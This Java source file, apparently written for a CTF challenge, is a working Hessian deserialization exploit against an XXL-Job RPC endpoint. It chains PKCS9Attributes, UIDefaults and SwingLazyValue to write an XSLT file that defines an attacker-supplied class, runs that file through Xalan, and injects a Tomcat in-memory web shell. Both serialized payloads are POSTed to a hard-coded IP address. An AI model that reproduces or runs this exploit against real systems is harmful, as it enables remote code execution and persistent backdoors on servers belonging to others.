package gadget.timu;


import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import com.xxl.job.core.rpc.codec.RpcRequest;
import com.xxl.rpc.serialize.impl.HessianSerializer;
import gadget.memshell.*;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.asynchttpclient.AsyncCompletionHandler;
import org.asynchttpclient.AsyncHttpClient;
import org.asynchttpclient.DefaultAsyncHttpClient;
import org.asynchttpclient.Response;
import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.aop.target.HotSwappableTargetSource;
import org.springframework.jndi.support.SimpleJndiBeanFactory;
import org.springframework.scheduling.annotation.AsyncAnnotationAdvisor;
import sun.reflect.ReflectionFactory;
import sun.security.pkcs.PKCS9Attribute;
import sun.security.pkcs.PKCS9Attributes;
import sun.swing.SwingLazyValue;

import javax.swing.*;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Random;

//import static com.sun.beans.decoder.FieldElementHandler.setFieldValue;

public class exp2 {
    private static void sendData(String url, byte[] bytes) {
        AsyncHttpClient c = new DefaultAsyncHttpClient();

        try{
            c.preparePost(url)
                    .setBody(bytes)
                    .execute(new AsyncCompletionHandler<Response>() {
                        @Override
                        public Response onCompleted(Response response) throws Exception {
                            System.out.println("Server Return Data: ");

                            System.out.println(response.getResponseBody());
                            return response;
                        }

                        @Override
                        public void onThrowable(Throwable t) {
                            System.out.println("HTTP出现异常");
                            t.printStackTrace();
                            super.onThrowable(t);
                        }
                    }).toCompletableFuture().join();

            c.close();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                c.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }


    }

    private final static String path = "/test.tmp";
    public static void main(String[] args) throws Exception {
        PKCS9Attributes pkcs9Attributes = createWithoutConstructor(PKCS9Attributes.class);
        UIDefaults uiDefaults = new UIDefaults();
        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue("com.sun.org.apache.xalan.internal.xslt.Process", "_main", new Object[]{new String[]{"-XT", "-XSL", path}}));
        setFiled("sun.security.pkcs.PKCS9Attributes",pkcs9Attributes,"attributes",uiDefaults);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(bos);
        bos.write(67);
        out.getSerializerFactory().setAllowNonSerializable(true);
        out.writeObject(pkcs9Attributes);
        out.close();

//        byte[] data = serializer.serialize(wrapper);
        HessianSerializer serializer = new HessianSerializer();
//        byte[] result1 = os.toByteArray();
//        RpcRequest rpcRequest = (RpcRequest) serializer.deserialize(wrapper, RpcRequest.class);
//        sendData("http://48.218.22.35:21010", getContent("E:\\ctf\\buu\\marshalsec\\target\\d.payload"));
//        RpcRequest rpcRequest = (RpcRequest) serializer.deserialize(witeClx(Test.class), RpcRequest.class);
//        rpcRequest = (RpcRequest) serializer.deserialize(bos.toByteArray(), RpcRequest.class);
        sendData("http://48.218.22.35:21010", witeClx(TomcatShellInject2.class));
//        Thread.sleep(1000);
//        Thread.currentThread().
        sendData("http://48.218.22.35:21010", bos.toByteArray());

//        serializer.deserialize(wrapper,Class.class);
//        ByteArrayInputStream bais = new ByteArrayInputStream(wrapper);
//        Hessian2Input input = new Hessian2Input(bais);
//        input.readObject();
    }
    final static String xsltTemplate = "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n" +
            "xmlns:b64=\"http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder\"\n" +
            "xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\"\n" +
            "xmlns:th=\"http://xml.apache.org/xalan/java/java.lang.Thread\"\n" +
            "xmlns:ru=\"http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils\"\n" +
            ">\n" +
            "    <xsl:template match=\"/\">\n" +
            "      <xsl:variable name=\"bs\" select=\"b64:decodeBuffer(b64:new(),'<base64_payload>')\"/>\n" +
            "      <xsl:variable name=\"cl\" select=\"th:getContextClassLoader(th:currentThread())\"/>\n" +
            "      <xsl:variable name=\"rce\" select=\"ru:defineClass('<class_name>',$bs,$cl)\"/>\n" +
            "      <xsl:value-of select=\"$rce\"/>\n" +
            "    </xsl:template>\n" +
            "  </xsl:stylesheet>";

    public static String genClassName() {
        Random random = new Random();
        int length = random.nextInt(10) + 1; // 随机生成字符串的长度，范围从1到10
        StringBuilder sb = new StringBuilder(length);
        for (int i = 0; i < length; i++) {
            char c = (char) (random.nextInt('z' - 'a') + 'a'); // 生成随机字符，范围从a到z
            sb.append(c);
        }
        return sb.toString();
    }
    public static byte[] witeClx(Class evilClass) throws Exception {
//        String path = "/tmp/flag.abc";
//        path = "E://test.tmp";

        //Pkcs9可以换成MimeTypeParameterList
        PKCS9Attributes pkcs9Attributes = createWithoutConstructor(PKCS9Attributes.class);
        UIDefaults uiDefaults = new UIDefaults();
        //PKCS9Attribute.EMAIL_ADDRESS_OID 是固定的，调试流程可以看到逻辑
        //去修改需要读取的文件，和写入的文件名，实例中是读取1.txt写入pwned.txt
        ClassPool cp = ClassPool.getDefault();
        cp.insertClassPath(new ClassClassPath(evilClass));
        CtClass cc = cp.get(evilClass.getName());
        cc.setName(genClassName());
        byte[] bs = cc.toBytecode();
        String base64Code = new sun.misc.BASE64Encoder().encode(bs).replaceAll("\n", "");
        String xslt = xsltTemplate.replace("<base64_payload>", base64Code).replace("<class_name>", cc.getName());
        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", new Object[]{path,xslt.getBytes()}));
        setFiled("sun.security.pkcs.PKCS9Attributes",pkcs9Attributes,"attributes",uiDefaults);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(bos);
        bos.write(67);
        out.getSerializerFactory().setAllowNonSerializable(true);
        out.writeObject(pkcs9Attributes);
        out.close();
        return bos.toByteArray();
    }
    public static void setFiled(String classname, Object o, String fieldname, Object value) throws Exception {
        Class<?> aClass = Class.forName(classname);
        Field field = aClass.getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(o, value);
    }
    public static byte[] getContent(String filePath) throws IOException {
        File file = new File(filePath);
        long fileSize = file.length();
        if (fileSize > Integer.MAX_VALUE) {
            System.out.println("file too big...");
            return null;
        }
        FileInputStream fi = new FileInputStream(file);
        byte[] buffer = new byte[(int) fileSize];
        int offset = 0;
        int numRead = 0;
        while (offset < buffer.length
                && (numRead = fi.read(buffer, offset, buffer.length - offset)) >= 0) {
            offset += numRead;
        }
        // 确保所有数据均被读取
        if (offset != buffer.length) {
            throw new IOException("Could not completely read file "
                    + file.getName());
        }
        fi.close();
        return buffer;
    }
    public static Object createWithoutConstructor(String classname) throws ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
        return createWithoutConstructor(Class.forName(classname));
    }

    public static <T> T createWithoutConstructor ( Class<T> classToInstantiate )
            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }
    public static <T> T createWithConstructor ( Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes,
                                                Object[] consArgs ) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        // 可以根据提供的Class的构造器来为classToInstantiate新建对象
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        // 实现不调用原有构造器去实例化一个对象，相当于动态增加了一个构造器
        Constructor<?> sc = ReflectionFactory.getReflectionFactory()
                .newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }

}

